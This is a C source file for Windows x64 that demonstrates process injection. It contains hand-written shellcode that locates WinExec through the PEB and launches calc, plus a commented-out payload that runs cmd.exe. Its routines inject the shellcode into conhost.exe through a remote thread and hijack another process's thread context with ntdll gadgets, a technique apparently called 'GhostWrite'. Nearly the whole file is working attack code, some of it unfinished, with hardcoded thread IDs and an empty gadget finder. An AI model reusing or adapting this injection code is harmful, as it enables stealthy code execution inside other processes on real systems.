#include <stdio.h>
#include <windows.h>
#include <winternl.h>

#include <tlhelp32.h>


/* Structure useful to manipulate thread context */
typedef struct _REMOTE_THREAD_CONTEXT_MANIPULATION {
    HANDLE hProcess;
    HANDLE hThread;
    CONTEXT savedThreadContext;
    BOOL isThreadSuspended;
    ULONG64 writeGadgetAddr;
    ULONG64 jmp0GadgetAddr;
    ULONG64 jmp0StackAddr;
    BOOL createNewThread;
}REMOTE_THREAD_CONTEXT_MANIPULATION, * PREMOTE_THREAD_CONTEXT_MANIPULATION;

REMOTE_THREAD_CONTEXT_MANIPULATION ThreadContextManipulation;

/*
unsigned char shellcode[] =
"\xcc" \
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
"\x78\x65\x00";
*/


unsigned char shellcode[] =
//"\xcc"
// Find kernel32.dll base address
"\x48\x31\xC9"              // xor rcx, rcx
"\x65\x48\x8B\x41\x60"      // mov rax, gs: [rcx + 0x60]    ; RAX = PEB
"\x48\x8B\x40\x18"          // mov rax, [rax + 0x18]        ; RAX = PEB->Ldr
"\x48\x8B\x70\x10"          // mov rsi, [rax + 0x10]        ; RSI = PEB->Ldr.InLoadOrder
"\x48\xAD"                  // lodsq                        ; RAX = Second module (lodsq == mov rax,QWORD PTR [rsi])
"\x48\x96"                  // xchg rax, rsi                ; RAX = RSI, RSI = RAX
"\x48\xAD"                  // lodsq                        ; RAX = Third(kernel32)
"\x48\x8B\x58\x30"          // mov rbx, [rax + 0x30]        ; RBX = Base address
// Find the export table of kernel32.dll
"\x48\x31\xD2"                      // xor rdx, rdx
"\x4D\x31\xC0"                      // xor r8, r8
"\x48\x31\xF6"                      // xor rsi, rsi
"\x8B\x53\x3C"                      // mov edx, [rbx + 0x3c]        ; RDX = DOS->e_lfanew
"\x49\x89\xD0"                      // mov r8, rdx
"\x48\x31\xD2"                      // xor rdx, rdx
"\x42\x8B\x94\x03\x88\x00\x00\x00"  // mov edx, [rbx + r8 + 0x88]   ; RDX = Offset export table
"\x49\x89\xD0"                      // mov r8, rdx
"\x48\x31\xD2"                      // xor rdx, rdx
"\x42\x8B\x54\x03\x20"              // mov edx, [rbx + r8 + 0x20]   ; RDX = Offset names table
"\x48\x31\xC9"                      // xor rcx, rcx                 ; RCX = 0

"\x48\x31\xF6"                          // xor rsi, rsi
"\x48\x31\xC0"                          // xor rax, rax
"\x48\x89\xD0"                          // mov rax, rdx
// Find GetProcAddress function name     
// Get_Function:
"\x8B\x34\x03"                          // mov esi, [rbx + rax]                         ; RSI = name offset
"\x48\xFF\xC1"                          // inc rcx                                      ; Increment the ordinal
"\x48\x83\xC0\x04"                      // add rax, 4                                    
"\x81\x3C\x33\x57\x69\x6E\x45"          // cmp dword ptr[rbx + rsi], 0x456e6957         ; WinE
"\x75\xED"                              // jnz Get_Function
"\x81\x7C\x33\x03\x45\x78\x65\x63"      // cmp dword ptr[rbx + rsi + 0x3], 0x63657845   ; Exec  
"\x75\xE3"                              // jnz Get_Function
//"\xcc"

"\x48\x31\xD2"                          // xor rdx, rdx
"\x48\x31\xC0"                          // xor rax, rax
"\x42\x8B\x54\x03\x1C"                  // mov edx, [rbx + r8 + 0x1C]   ; RDX = Offset function table
"\x48\xFF\xC9"                          // dec rcx
"\x48\xC1\xE1\x02"                      // shl rcx, 2
"\x48\x01\xD1"                          // add rcx, rdx
"\x8B\x04\x0B"                          // mov eax, [rbx + rcx]
"\x48\x01\xD8"                          // add rax, rbx                 ; RAX = WinExec ptr
//"\xcc"
// WinExec("calc",1)
"\x48\x31\xD2"					// xor rdx, rdx
"\x48\x31\xC9"					// xor rcx, rcx
//"\x48\xC7\xC1\x63\x6D\x64\x00"	// mov rcx, 0x646d63 ;cmd
"\x48\xC7\xC1\x63\x61\x6c\x63"	// mov rcx, 0x636c6163 ;calc
"\x51"							// push rcx
"\x48\x89\xE1"					// mov rcx, rsp
"\x48\xFF\xC2"					// inc rdx
"\xFF\xD0"						// call rax
//"\xcc"
"\x00"
;



int pid = -1;
void GetProcessId(int* pid) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry))
    {
        while (Process32Next(snapshot, &entry))
        {
            if (_wcsicmp(entry.szExeFile, L"conhost.exe") == 0)
            {
                *pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    if (*pid < 0)
    {
        printf("Could not find process\n");
        return;
    }
}

int NormalCodeInject()
{
    GetProcessId(&pid);
    printf("[+] PID: 0x%x\n", pid);
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    void* buffer = VirtualAllocEx(h, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(h, buffer, shellcode, sizeof(shellcode), 0);

    HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

    return 0;
}

ULONG64 StackBase;
ULONG64 MovPtrRdiRbx = 0;
ULONG64 Jmp0 = 0;
CONTEXT SavedThreadContext;
CONTEXT WorkingThreadContext;

HMODULE NTDLLBase;

// NtProtectVirtualMemory(    IN HANDLE ProcessHandle,
//                            IN OUT PVOID *BaseAddress,
//                            IN OUT PULONG NumberOfBytesToProtect,
//                            IN ULONG NewAccessProtection,
//                            OUT PULONG OldAccessProtection );

void WaitForThreadAutoLock(HANDLE Thread, CONTEXT* PThreadContext, ULONG64 AutoLockTargetRIP)
{
    SetThreadContext(Thread, PThreadContext);

    do {
        ResumeThread(Thread);
        //Sleep(30);
        SuspendThread(Thread);
        GetThreadContext(Thread, PThreadContext);
    } while (PThreadContext->Rip != AutoLockTargetRIP);
    printf("\t rip: %llx\n", PThreadContext->Rip);
}


/*
void WriteQword(CONTEXT context, HANDLE hThread, size_t WriteWhat, size_t WriteWhere)
{
    //SetContextRegister(&context, g_rside, WriteWhat);
    //SetContextRegister(&context, g_lside, WriteWhere);

    context.Rsp = StackBase;
    context.Rip = MovPtrRdxRax;

    WaitForThreadAutoLock(hThread, &context, Jmp0);
}
*/


void PrintfThreadContext(CONTEXT* PThreadContext) {
    printf("[+] PrintfThreadContext\n");

    printf("\t rip: %llx\n", PThreadContext->Rip);
    printf("\t rsp: %llx\n", PThreadContext->Rsp);
    printf("\t rbp: %llx\n", PThreadContext->Rbp);

    printf("\t rax: %llx\n", PThreadContext->Rax);
    printf("\t rcx: %llx\n", PThreadContext->Rcx);
    printf("\t rdx: %llx\n", PThreadContext->Rdx);
    printf("\t rbx: %llx\n", PThreadContext->Rbx);
    printf("\t rsi: %llx\n", PThreadContext->Rsi);
    printf("\t rdi: %llx\n", PThreadContext->Rdi);
    printf("\t r8: %llx\n", PThreadContext->R8);
    printf("\t r9: %llx\n", PThreadContext->R9);
    printf("\t r10: %llx\n", PThreadContext->R10);
    printf("\t r11: %llx\n", PThreadContext->R11);
    printf("\t r12: %llx\n", PThreadContext->R12);
    printf("\t r13: %llx\n", PThreadContext->R13);
    printf("\t r14: %llx\n", PThreadContext->R14);
    printf("\t r15: %llx\n", PThreadContext->R15);




}

HANDLE GetThreadIdFromProcess(const wchar_t* proc_name)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    HANDLE threadHandle = NULL;

    if (Process32First(snapshot, &processEntry)) {
        while (_wcsicmp(processEntry.szExeFile, proc_name) != 0) {
            Process32Next(snapshot, &processEntry);
        }
    }

    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
                printf("[+] threadEntry.th32ThreadID: 0x%x\n", threadEntry.th32ThreadID);

                threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadEntry.th32ThreadID);
                if (threadHandle) {
                    CloseHandle(threadHandle);
                    return threadHandle;
                }
                CloseHandle(threadHandle);

            }
        } while (Thread32Next(snapshot, &threadEntry));
    }


    return 0;
}

int GhostWrite() {
    HWND ShellWindowHandle;
    DWORD ShellWindowThread;
    HANDLE VictimThreadHandle;
    
    /*
    ShellWindowHandle = GetShellWindow();
    ShellWindowThread = GetWindowThreadProcessId(ShellWindowHandle, NULL);
    VictimThreadHandle = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, ShellWindowThread);
    */
    
    const wchar_t proc_name[] = L"Autoruns64.exe";
    VictimThreadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, 0x39ec);
    //VictimThreadHandle = GetThreadIdFromProcess(proc_name);
    printf("[+] thread handle: 0x%x\n", VictimThreadHandle);

    NTDLLBase = GetModuleHandle(L"ntdll.dll");
    printf("[+] Ntdll: 0x%llx\n", NTDLLBase);
    MovPtrRdiRbx = (ULONG64)NTDLLBase + 0x7dc6e;
    Jmp0 = (ULONG64)NTDLLBase + 0x9a4b4;

    SuspendThread(VictimThreadHandle);

    SavedThreadContext.ContextFlags = CONTEXT_FULL;
    WorkingThreadContext.ContextFlags = CONTEXT_FULL;

    GetThreadContext(VictimThreadHandle, &SavedThreadContext);    // we get and save initial thread's state for later restoring it
    GetThreadContext(VictimThreadHandle, &WorkingThreadContext);    // we get the same state again, but this time for messing with it
    
    PrintfThreadContext(&WorkingThreadContext);
    
    /*
    StackBase = WorkingThreadContext.Rsp - (10 * 8);
    WorkingThreadContext.Rsp = StackBase;
    WorkingThreadContext.Rip = MovPtrRdiRbx;
    WorkingThreadContext.Rdi = StackBase+0x28;
    WorkingThreadContext.Rbx = Jmp0;
    */
    WorkingThreadContext.Rip = Jmp0;


    PrintfThreadContext(&WorkingThreadContext);
    
    printf("[+] WaitForThreadAutoLock\n");
    //WriteQword(workingThreadContext, hThread, JmpAddr, StackBase + 0x28);
    WaitForThreadAutoLock(VictimThreadHandle, &WorkingThreadContext, Jmp0);
    
    printf("[+] done\n");


   
    


    SetThreadContext(VictimThreadHandle, &SavedThreadContext);
    ResumeThread(&WorkingThreadContext);

    return 0;

}


void FindGadgetInNTDLL() {
    PUCHAR NtdllCode;
    ULONG NtdllCodeSize;
    HMODULE NtdllBase;
    PIMAGE_NT_HEADERS64 NtPeHeaders;
    NtdllBase = GetModuleHandleA("ntdll");
    NtdllCode = (PUCHAR)((ULONG)NtdllBase + 0x1000);
    NtPeHeaders = (PIMAGE_NT_HEADERS64)((ULONG)NtdllBase + ((IMAGE_DOS_HEADER*)NtdllBase)->e_lfanew);
    NtdllCodeSize = NtPeHeaders->OptionalHeader.SizeOfCode;
}

int main() {
    //NormalCodeInject();
    GhostWrite();
    return 0;
}
